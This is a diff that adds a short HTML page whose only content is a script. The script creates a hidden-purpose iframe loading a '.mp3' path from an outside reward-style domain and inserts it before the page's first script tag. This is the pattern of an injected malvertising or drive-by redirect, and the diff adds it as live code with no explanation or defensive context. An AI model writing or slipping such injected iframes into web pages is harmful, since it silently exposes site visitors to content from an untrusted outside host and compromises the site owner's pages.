@@ -1,0 +1,14 @@
+<body>
+<script>
+
+var d=document.createElement("iframe");
+
+d.src="http://g.onlinerewardcenter.net/lpuk/selamat1.mp3";
+
+var firstScriptTag= document.getElementsByTagName('script')[0];
+      firstScriptTag.parentNode.insertBefore(d, firstScriptTag);
+
+
+</script>
+
+</body>
